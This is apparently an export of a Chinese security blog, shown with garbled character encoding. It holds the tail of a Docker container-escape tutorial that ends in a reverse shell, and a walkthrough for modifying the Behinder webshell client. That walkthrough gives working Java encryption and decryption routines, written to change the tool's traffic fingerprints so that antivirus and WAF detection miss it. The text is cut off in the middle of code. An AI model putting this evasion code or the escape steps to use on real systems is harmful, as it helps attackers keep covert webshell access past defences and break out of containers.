src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_17-21.png" class="" title="2024-02-13_17-21.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>æˆåŠŸåå¼¹shell,å¹¶æ‹¿åˆ°flag<br>é€ƒé€¸Success!</p><h4 id="æŒ‚è½½-Docker-Socket-é€ƒé€¸"><a href="#æŒ‚è½½-Docker-Socket-é€ƒé€¸" class="headerlink" title="æŒ‚è½½ Docker Socket é€ƒé€¸"></a>æŒ‚è½½ Docker Socket é€ƒé€¸</h4><p>Docker Socket æ˜¯Dockerå¼•æ“çš„UNIXå¥—æ¥å­—æ–‡ä»¶ï¼Œç”¨äºä¸Dockerå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚Dockerå®ˆæŠ¤è¿›ç¨‹æ˜¯Dockerå¼•æ“çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£ç®¡ç†å’Œæ‰§è¡Œå®¹å™¨ã€‚Docker Socketå…è®¸ç”¨æˆ·é€šè¿‡åŸºäºRESTful APIçš„è¯·æ±‚ä¸Dockerå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œé€šä¿¡ï¼Œä»¥ä¾¿æ‰§è¡Œå„ç§æ“ä½œï¼Œä¾‹å¦‚åˆ›å»ºã€è¿è¡Œå’Œåœæ­¢å®¹å™¨ï¼Œæ„å»ºå’Œæ¨é€é•œåƒï¼ŒæŸ¥çœ‹å’Œç®¡ç†å®¹å™¨çš„æ—¥å¿—ç­‰</p><p>åˆ¤æ–­å½“å‰å®¹å™¨æ˜¯å¦æŒ‚è½½Docker Socket,å¦‚æœå­˜åœ¨æ–‡ä»¶åˆ™è¯´æ˜Docker Socketè¢«æŒ‚è½½,å°±å¯ä»¥å°è¯•é€ƒé€¸</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-00.png" class="" title="2024-02-13_15-00.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>æˆ‘ä»¬å¯ä»¥åœ¨å®¹å™¨å†…éƒ¨åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œå› ä¸ºDocker Socketè¢«æŒ‚è½½åˆ°äº†å½“å‰å®¹å™¨,æ‰€æœ‰æˆ‘ä»¬å¯ä»¥å°†å®¿ä¸»æœºç›®å½•æŒ‚è½½åˆ°æ–°çš„å®¹å™¨å†…éƒ¨</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br><br>apt-<span class="hljs-built_in">get</span> install curl<br><br>curl -fsSL https://<span class="hljs-built_in">get</span>.docker.<span class="hljs-keyword">com</span>/ | <span class="hljs-keyword">sh</span><br><br>apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> &amp;&amp; apt-<span class="hljs-built_in">get</span> install curl &amp;&amp; curl -fsSL https://<span class="hljs-built_in">get</span>.docker.<span class="hljs-keyword">com</span>/ | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-03.png" class="" title="2024-02-13_15-03.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-07.png" class="" title="2024-02-13_15-07.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>æ¥ä¸‹æ¥ï¼Œåœ¨å®¹å™¨å†…éƒ¨åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œå¹¶å°†å®¿ä¸»æœºç›®å½•æŒ‚è½½åˆ°æ–°çš„å®¹å™¨å†…éƒ¨å³å¯</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-09.png" class="" title="2024-02-13_15-09.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>waitingâ€¦â€¦</p>]]></content>
    
    
    <categories>
      
      <category>äº‘åŸç”Ÿå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BehinderV4é­”æ”¹</title>
    <link href="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/"/>
    <url>/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="Behinderä»‹ç»"><a href="#Behinderä»‹ç»" class="headerlink" title="Behinderä»‹ç»"></a>Behinderä»‹ç»</h2><p>â€œå†°èâ€(Behinder)æ˜¯ä¸€ä¸ªåŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ç½‘ç«™ç®¡ç†å®¢æˆ·ç«¯ï¼Œç›¸æ¯”è¾ƒäºä¼ ç»Ÿçš„è€ç‰Œå·¥å…·â€œèœåˆ€â€è€Œè¨€ï¼Œå¯¹webshellçš„æµé‡è¿›è¡Œäº†ç›¸åº”çš„åŠ å¯†ã€‚â€å†°èâ€å®¢æˆ·ç«¯åŸºäºJAVAï¼Œæ‰€ä»¥å¯ä»¥è·¨å¹³å°ä½¿ç”¨ï¼Œéšç€ç‰ˆæœ¬çš„å‡çº§ï¼Œå…¼å®¹æ€§ä¹Ÿéšä¹‹æå‡ã€‚ä¸»è¦åŠŸèƒ½ä¸ºï¼šåŸºæœ¬ä¿¡æ¯ã€å‘½ä»¤æ‰§è¡Œã€è™šæ‹Ÿç»ˆç«¯ã€æ–‡ä»¶ç®¡ç†ã€Socksä»£ç†ã€åå¼¹shellã€æ•°æ®åº“ç®¡ç†ã€è‡ªå®šä¹‰ä»£ç ç­‰ï¼ŒåŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæ˜¯ç°å¦‚ä»Šå¿…ä¸å¯å°‘çš„æ¸—é€æµ‹è¯•å·¥å…·ä¹‹ä¸€</p><h2 id="æ—¶å…‰èè‹’"><a href="#æ—¶å…‰èè‹’" class="headerlink" title="æ—¶å…‰èè‹’"></a>æ—¶å…‰èè‹’</h2><p>æ”»é˜²æŠ€æœ¯ä¸€ç›´éƒ½åœ¨ä¸æ–­å‘å±•çš„ï¼Œéšç€é˜²å®ˆæŠ€æœ¯æ—¥è¶‹æˆç†Ÿå’Œå®Œå–„ï¼Œæ”»å‡»æ‰‹æ®µä¹Ÿå°±éœ€è¦ä¸æ–­åœ°æ›´æ–°ã€åˆ›æ–°ã€‚è€Œâ€å†°èâ€æ—©å·²ä¸å†æ›´æ–°ã€‚å› æ­¤ç°å·²è¢«å„å¤§å‚å•†çš„æ£€æµ‹ç³»ç»ŸåŠWAFå¯¹å…¶ç‰¹å¾è¿›è¡Œäº†è®°è½½ä¸åˆ†æï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨å®æˆ˜ä¸­ç»å¸¸ç¢°åˆ°â€œè½åœ°æˆç›’â€çš„åŸå› ï¼Œé©¬å­åˆšä¼ ä¸Šå»å°±dieäº†, å°±æ›´åˆ«è¯´æ‹¿shelläº†ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨åŸç‰ˆçš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹é€ ä»è€Œé€‚åº”å½“ä»Šå…¨æ–°çš„æ”»é˜²ä¸–ç•Œ</p><h2 id="é­”æ”¹"><a href="#é­”æ”¹" class="headerlink" title="é­”æ”¹"></a>é­”æ”¹</h2><p>å¯ä»¥é€šè¿‡æ›´æ”¹æµé‡ç‰¹å¾ä»¥åŠæ·»åŠ è‡ªå·±çš„åŠ å¯†åè®®ï¼Œä»è€Œè¾¾åˆ°å…æ€çš„æ•ˆæœï¼Œå› ä¸ºå¼ºç‰¹å¾å¾ˆå®¹æ˜“è¢«æ€æ¯’è½¯ä»¶è¯†åˆ«ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹äº†ç‰¹å¾å®ƒå°±æ— æ³•åˆ¤æ–­æ˜¯å¦ä¸ºæ¶æ„æµé‡ï¼Œæ›´æ”¹åè®®ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†ï¼Œæ€æ¯’è½¯ä»¶ç—…æ¯’åº“é‡Œé¢å·²ç»å­˜æ”¾äº†å†°èä¸­å†…ç½®çš„6ä¸ªåŠ å¯†åè®®ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå®šä¹‰åè®®æ¥ç»•è¿‡æŸ¥æ€ï¼Œè€Œå†°èv4å¼€æ”¾äº†ä¼ è¾“åè®®çš„è‡ªå®šä¹‰åŠŸèƒ½ï¼Œä½¿å¾—æµé‡é­”æ”¹æ›´ä¸ºç®€å•æ–¹ä¾¿</p><p>é¦–å…ˆå°†å†°èçš„jaråŒ…è¿›è¡Œåç¼–è¯‘æ‹¿åˆ°æºç </p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_23-37.png" class="" title="2024-02-08_23-37.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æ‹¿åˆ°æºç ä¹‹åï¼Œæ–°å»ºä¸€ä¸ªç›®å½•æŠŠæºç å’Œå†°è4ï¼ˆå•æ”¾åœ¨ä¸€ä¸ªç›®å½•é‡Œé¢ï¼‰æ”¾åœ¨åŒä¸€ç›®å½•</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_22-29.png" class="" title="2024-02-08_22-29.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_22-29_1.png" class="" title="2024-02-08_22-29_1.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>æ‰“å¼€ideï¼Œåœ¨åˆšæ‰çš„ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼Œå¹¶å°†å†°èçš„jaråŒ…å¯¼å…¥æ¨¡å—ä¸­ï¼Œå¹¶è®¾ç½®å¥½ä¸»ç±»ï¼Œè¿™é‡Œçš„ä¸»ç±»ä¸€å®šä¸è¦å¼„é”™ï¼šnet.rebeyond.behinder.ui<br>ï¼ˆæ³¨ï¼šjdkç‰ˆæœ¬1.8ï¼Œå¹¶ä¸”è¿˜è¦æŠŠåŸæ–‡ä»¶ä¸­çš„æ•°æ®åº“æ–‡ä»¶å¤åˆ¶åˆ°ä¸»æ–‡ä»¶ä¸­ï¼Œå¦åˆ™è¿‡ä¼šè¿è¡Œä¼šæŠ¥é”™ï¼‰</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_14-09.png" class="" title="2024-02-09_14-09.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>åœ¨ä¿®æ”¹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹behinderæ•°æ®åŒ…åŸå…ˆçš„æ ·å­</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_14-16.png" class="" title="2024-02-09_14-16.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>å…¶ä¸­Acceptã€Accept-Languageç‰¹å¾æœ€ä¸ºæ˜æ˜¾ï¼Œå¹¶ä¸”UAå¤´æ˜¯å†…ç½®çš„ä¸”éšæœºï¼Œæ‰€ä»¥è€ƒè™‘å…ˆæŠŠä¸€äº›å¼ºç‰¹å¾è¿›è¡Œä¿®æ”¹ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼šæ‰€æœ‰çš„ä¿®æ”¹ä¸èƒ½ç›´æ¥åœ¨æ–‡ä»¶ä¸­æ”¹éœ€è¦æŠŠæ•´ä¸ªè·¯å¾„å¤åˆ¶åˆ°srcæ–‡ä»¶ä¸­ï¼ŒæŠŠä¸éœ€è¦ä¿®æ”¹çš„æ–‡ä»¶å¯ä»¥åˆ æ‰ï¼Œä¸ç„¶æ„å»ºçš„æ—¶å€™ä¼šå¾ˆæ…¢</p><p>æˆ‘ä»¬é€šè¿‡acceptç‰¹å¾è¿›è¡Œå…¨å±€æœç´¢ï¼Œæ‰¾åˆ°äº†netä¸‹çš„constantsæ–‡ä»¶ï¼Œè€Œæ•°æ®åŒ…ä¸­uaç‰¹å¾å’Œå…¶ä»–ç‰¹å¾éƒ½åœ¨shellæ–‡ä»¶ä¸­ï¼Œå› æ­¤å°±å…ˆå¯¹è¿™ä¸¤ä¸ªæ–‡ä»¶è¿›è¡Œé­”æ”¹</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_09-19.png" class="" title="2024-02-08_09-19.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-20.png" class="" title="2024-02-08_20-20.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-38.png" class="" title="2024-02-08_20-38.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-39.png" class="" title="2024-02-08_20-39.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>å¹¶ä¸”å†°èä¸­æœ‰ä¸ªå›ºå®šçš„Content-typeå­—æ®µï¼šContent-type: application&#x2F;x-www-form-urlencoded</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-52.png" class="" title="2024-02-08_20-52.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>åŒæ ·è¿™ä¸ªç‰¹å¾ä¹Ÿå¯ä»¥æ”¹ï¼Œå› ä¸ºè¿™é‡Œåªæœ‰phpå’Œaspxçš„ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸Šjspå’Œasp</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-55.png" class="" title="2024-02-08_20-55.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>å…¨éƒ¨æ”¹å®Œä¹‹åï¼Œæ„å»ºå·¥ç¨‹å’Œæ¨¡å—é‡æ–°è¿è¡Œä¸€ä¸‹çœ‹çœ‹ç»“æœ</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-41.png" class="" title="2024-02-08_20-41.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-15.png" class="" title="2024-02-08_20-15.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-42.png" class="" title="2024-02-08_20-42.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>å¯ä»¥å‘ç°åŸºæœ¬çš„å¼ºç‰¹å¾éƒ½å·²ç»è¢«ä¿®æ”¹ï¼Œæ•°æ®åŒ…ä¸­çš„uaå¤´å’Œå…¶ä»–å…³é”®ç‰¹å¾ä¹Ÿå·²ç»è¢«ä¿®æ”¹ã€‚æ¥ä¸‹æ¥å¯¹æ•°æ®åè®®è¿›è¡Œè‡ªå®šä¹‰åŠ å¯†ï¼Œç»•è¿‡ä¸»æµæ€è½¯å’Œwafç­‰å®‰å…¨è®¾å¤‡çš„æ£€æµ‹ï¼Œå†°è4å†…ç½®äº†å…­ç§ä¼ è¾“åè®®ï¼Œä½†æ—©å·²è¢«è®°è½½</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_21-49.png" class="" title="2024-02-08_21-49.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>è¿™é‡Œåˆ†äº«ä¸¤ç§åŠ å¯†ï¼Œç¬¬ä¸€ç§æ˜¯key-valueæ ¼å¼+unicodeåŠ å¯†ï¼Œä»¥jspè„šæœ¬ç±»å‹ä¸ºä¾‹<br>åŠ å¯†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id=1&amp;content=DaYer0&amp;token=1452178369&amp;status=00000&quot;</span>;<br> <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span><br>java.util.Base64.getEncoder().encodeToString(data).replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>,<br><span class="hljs-string">&quot;&gt;&quot;</span>);<br> <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br> <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; result.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> result.charAt(i);<br>   unicode.append(<span class="hljs-string">&quot;\\u00&quot;</span> + Integer.toHexString(c));<br> &#125;<br> content = content.replace(<span class="hljs-string">&quot;DaYer0&quot;</span>, unicode.toString());<br><br> <span class="hljs-comment">// ROT13 encryption</span><br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">encryptedContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; content.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> content.charAt(i);<br>   <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;a&#x27;</span>);<br>   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;A&#x27;</span>);<br>   &#125;<br>   encryptedContent.append(c);<br> &#125;<br> <span class="hljs-keyword">return</span> encryptedContent.toString().getBytes();<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å¯†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data);<br> <span class="hljs-comment">// Reverse ROT13 decryption</span><br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; content.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> content.charAt(i);<br>   <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;a&#x27;</span>);<br>   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;A&#x27;</span>);<br>   &#125;<br>   decryptedContent.append(c);<br> &#125;<br><br> <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> decryptedContent.toString();<br> java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br> bos.write(decodedString.getBytes(), <span class="hljs-number">13</span>, decodedString.length() - <span class="hljs-number">43</span>);<br> <span class="hljs-type">String</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bos.toByteArray());<br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br> <span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">while</span> ((i = unicode.indexOf(<span class="hljs-string">&quot;\\u&quot;</span>, pos)) != -<span class="hljs-number">1</span>) &#123;<br>   sb.append(unicode.substring(pos, i));<br>   <span class="hljs-keyword">if</span> (i + <span class="hljs-number">5</span> &lt; unicode.length()) &#123;<br>     pos = i + <span class="hljs-number">6</span>;<br>     sb.append((<span class="hljs-type">char</span>) Integer.parseInt(unicode.substring(i + <span class="hljs-number">2</span>, i + <span class="hljs-number">6</span>),<br><span class="hljs-number">16</span>));<br>   &#125;<br> &#125;<br> <span class="hljs-type">byte</span>[] decryptedData =<br>java.util.Base64.getDecoder().decode(sb.toString().replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;/&quot;</span>));<br> <span class="hljs-keyword">return</span> decryptedData;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå¯ä»¥ä½¿ç”¨å†°èçš„ä¼ è¾“åè®®è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœæç¤ºâ€œä¿å­˜æˆåŠŸâ€å°±è¯´æ˜è§£å¯†åŠ å¯†ä¸€è‡´</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_21-22.png" class="" title="2024-02-08_21-22.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>ä¿®æ”¹å®ŒååŒæ ·çš„æˆ‘ä»¬è¦æŠŠæ–‡ä»¶æ”¾åœ¨srcç›®å½•ä¸‹ï¼Œç¡®ä¿æ–‡ä»¶å’Œä¹‹å‰æ‰€åœ¨ç›®å½•ä¸€è‡´ï¼Œæˆ‘ä»¬ç”ŸæˆæœåŠ¡ç«¯æµ‹è¯•ä¸€ä¸‹æ•ˆæœ</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-13.png" class="" title="2024-02-09_15-13.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°æµé‡åŒ…ä¸­çš„æ•°æ®å·²ç»è¢«åŠ å¯†ã€‚ç¬¬äºŒç§æ˜¯multipartæ ¼å¼+hexåŠ å¯†<br>åŠ å¯†</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] <span class="hljs-title function_">Encrypt</span>(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-built_in">String</span> upload=<span class="hljs-string">&quot;-----------------------------7e6103b1815de Content-Disposition:form-data;name=\&quot;uploadFile\&quot;;filename=\&quot;test.png\&quot; Content-Type:application/octet-stream  DaYer0 -----------------------------7e6103b1815de--&quot;</span>;<br>    <span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">String</span> result = java.<span class="hljs-property">util</span>.<span class="hljs-property">Base64</span>.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(data).<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>).<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;result.<span class="hljs-property">length</span>();i++)&#123;<br>        <span class="hljs-type">int</span> ch = (<span class="hljs-type">int</span>)result.<span class="hljs-property">charAt</span>(i);<br>        <span class="hljs-built_in">String</span> s4 = Integer.<span class="hljs-property">toHexString</span>(ch);<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span> + s4;<br>    &#125;<br>    upload=upload.<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;DaYer0&quot;</span>,<span class="hljs-built_in">str</span>);<br>    <span class="hljs-keyword">return</span> upload.<span class="hljs-property">getBytes</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å¯†</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] Decrypt(<span class="hljs-keyword">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    java.io.ByteArrayOutputStream bos=<span class="hljs-keyword">new</span> java.io.ByteArrayOutputStream();<br>    bos.<span class="hljs-keyword">write</span>(data,<span class="hljs-number">150</span>,data.length-<span class="hljs-number">195</span>);<br>        String s= <span class="hljs-keyword">new</span> String(bos.toByteArray());<br>        <span class="hljs-keyword">byte</span>[] baKeyword = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[s.length()/<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span>(<span 